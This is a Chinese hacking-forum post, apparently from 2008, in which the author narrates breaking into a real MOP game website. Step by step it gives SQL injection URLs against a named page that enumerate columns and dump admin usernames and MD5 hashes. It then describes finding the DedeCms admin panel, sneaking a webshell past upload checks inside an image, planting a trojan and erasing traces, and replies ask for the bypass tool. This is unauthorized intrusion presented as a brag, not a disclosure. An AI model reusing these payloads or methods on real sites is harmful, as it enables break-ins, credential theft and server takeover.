@@ -1,0 +1,77 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Mop 游戏的一次入侵
+D8888D主贴内容-------------------------------------------------------
+ps: 文章小帅写的，不是我原创，应该投稿了吧，当初webshell给我测试，是一台MOP反向代理服务器。
+某天，我和bloodsword大牛在玩，遇到了个mop注射点，起于好奇心的诱惑，溜达之，发现遇到了很多的困难。谁知今天又看到了那个站，于是乎就想写写什么，因为上次遇到的问题真的太多了，写啊写不完。最近五一放假，相对来说有点时间，于是想抄起武器再溜达次，顺便把过程给写写。
+首先是一个游戏的站。隶属于mop的，是大话西游的官方地址。上面有许多的下载文件。
+如图1
+[attach]59[/attach]
+注入点为：[url=http://www.zg.mop.com/service/sales.php?newsId=1178]链接标记http://www.zg.mop.com/service/sales.php?newsId=1178[/url]，于是开始注射，我比较喜欢手动的，因为我喜欢看到那个熟悉的MD5页面，于是开始手动注射，
+判断长度：[url=http://www.zg.mop.com/service/sales.php?newsId=1178]链接标记http://www.zg.mop.com/service/sales.php?newsId=1178[/url] order by 25/*，
+发现返回错误，[url=http://www.zg.mop.com/service/sales.php?newsId=1178]链接标记http://www.zg.mop.com/service/sales.php?newsId=1178[/url] order by 24/*返回正常，那么就是24个长度了，
+[url=http://www.zg.mop.com/service/sales.php?newsId=1178]链接标记http://www.zg.mop.com/service/sales.php?newsId=1178[/url] and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/*
+发现返回如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_988cf4df2ef72a0296b2nLIYmOtVrTBf.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjB8MjM2NmIyZGV8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (205.53 KB)
+
+2008-9-28 22:26
+于是开始把“12”、“13”2出用列来代替，随便想了个admin表，想了个userid，构造[url=http://www.zg.mop.com/service/sales.php?newsId=1178]链接标记http://www.zg.mop.com/service/sales.php?newsId=1178[/url] and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,userid,14,15,16,17,18,19,20,21,22,23,24 from admin/*
+结果返回如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_50b7248d4ce708b5c298xqpNKMe9WJSc.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjF8YzRjNTZjZjJ8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (36.73 KB)
+
+2008-9-28 22:26
+最后猜到了一些信息，发现权限不是root的，也就是一个一般的账号，看来load_file这个路已经没戏了，换路。继续构造：
+[url=http://www.zg.mop.com/service/sales.php?newsId=1178%20and%201=2%20union%20select%201]链接标记http://www.zg.mop.com/service/sa ... 0union%20select%201[/url],2,3,4,5,6,7,8,9,10,11,pwd,userid,14,15,16,17,18,19,20,21,22,23,24%20from%20admin/*爆出了个MD5，发现这个MD5无法破解，真郁闷，难道就这么死了？！不行！继续找管理级的账号，
+于是用limit，构造语句[url=http://www.zg.mop.com/service/sales.php?newsId=1178%20and%201=2%20union%20select%201]链接标记http://www.zg.mop.com/service/sa ... 0union%20select%201[/url],2,3,4,5,6,7,8,9,10,11,pwd,userid,14,15,16,17,18,19,20,21,22,23,24%20from%20admin limit1,1，读出第2条记录，
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_cf43d17266d491fa628e5v2osFrS2hHU.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjJ8ZWE0YjVhOTN8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (31.15 KB)
+
+2008-9-28 22:26
+于是跑出了账号密码，32位加密的MD5，接着开始找后台，郁闷的是，找后台并不是想的那么简单的！啊D，明小子什么的扫了很久也没扫出什么花样，最后还是bloodsword大牛的注射工具比较强大，字典真厚，扫出了个setup目录，登录一看，吓到我了，原来是织梦的系统……这下，嘿嘿，后台等于拿到手了。如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_4f3b5455b55e0979d797XbgwJYjGlAGV.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjN8YjgyYzIwOGV8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (43.85 KB)
+
+2008-9-28 22:26
+就是喜欢看到“Power by DedeCms 织梦内容管理系统”这几个字，于是去down了份织梦的系统，顺利的找到了后台地址，并且登陆，如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_1f6a2f4b4523c18c62e8ox5rr03eurlm.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjR8NTljYzMwZDd8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (269.16 KB)
+
+2008-9-28 22:26
+这下比较不错了，嘿嘿，还能做点事了，看了下这个版本并不是很高，就试了下上传的办法，下载了个angel的spy2008来看看，很是郁闷，无论上传什么东西都无法进去，记得我们上次进去的时候是通过一个老外的软件，加了层马甲（把字符写入图片的工具）这样才混过检查的，于是厚着脸皮又一次的问bloodsword大牛要了份来，也成功的混过去了，大家觉得我们上传木马很简单一样的，其实其中的辛苦又谁知道呢！当一次次的挫折，一次次的错误提示，咱也害怕，害怕离成功只有那么一步，你却不知道。最后东西的确上传上去了，回显也不是404，上次是显示404
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_48745b47fb608a18f025IzAxnRmzHqew.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjV8OGFiYzRmOWV8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (128.31 KB)
+
+2008-9-28 22:26
+不知道为什么，可能是加了一般的马甲混不过去，手动加上文件头欺骗不成功，返回404错误，加了那工具后就成功了。如图
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_423daa10bbe4c34851a1HD1WxX9qktrV.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NjZ8OTdlMzZiYzZ8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (58.35 KB)
+
+2008-9-28 22:26
+嘿嘿，这个是图片服务端了，就是怕gpc会影响到一句话的解析，所以采用了这个方式，只要回显并不是上面的那个404错误就行，用客户端连上去，传个马，擦下屁股一切ok了,
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0809/20080928_45938140ec856f5c5ea7PUa3Esi2QcAB.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=Njd8YmNlMmMzNmJ8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记下载[/url] (74.5 KB)
+
+2008-9-28 22:26
+上次就是差不多这么拿到的，后来仔细一看发现这个服务器真老了。很多牛X同学都来过了，通过痕迹可以看出他们还成功提权上去了的，都是root的权限，就小菜我，连linux也不懂，自己的shell还只是nobody的权限，悲哀……这个文章就为我的无知纪念下吧，因为学习都是有进步的。
+
+[  ]
+[url=http://www.t00ls.net/attachment.php?aid=Njh8YjY2M2M5NWV8MTI4NjQ4NTM3MnxlODRjQ0NrSTVMNjEwbHhzbTJFMzFmRWJBWFZxRTUwNGlZcWp4T21RbGhKb2d2VQ%3D%3D&nothumb=yes]链接标记b6.jpg[/url] (107.13 KB) 
+下载次数:1
+2008-9-28 22:26
+
+ [img]http://www.t00ls.net/attachments/month_0809/20080928_bd46d94da129813112e5tcZYHVaXODcI.jpg[/img]
+D8888D回贴内容-------------------------------------------------------
+xiong141 很黄。很暴力。
+
+D8888D回贴内容-------------------------------------------------------
+dede这么低的版本
+
+D8888D回贴内容-------------------------------------------------------
+漏洞早不在了，几个月前的事了。这个注入早不在了，有个新的注入可以搞到密码。不过再也搞不到shell，了不行大家试试
+
+D8888D回贴内容-------------------------------------------------------
+不错，字典厚就是牛B。最郁闷的事情莫过与有了帐号密码找不到登陆的地方xiong271 xiong271
+
+D8888D回贴内容-------------------------------------------------------
+bloodsword是谁呢？
+
+D8888D回贴内容-------------------------------------------------------
+xiong141 ~~~~~~~~~~
+
+D8888D回贴内容-------------------------------------------------------
+强烈要求把“马甲”丢出来！
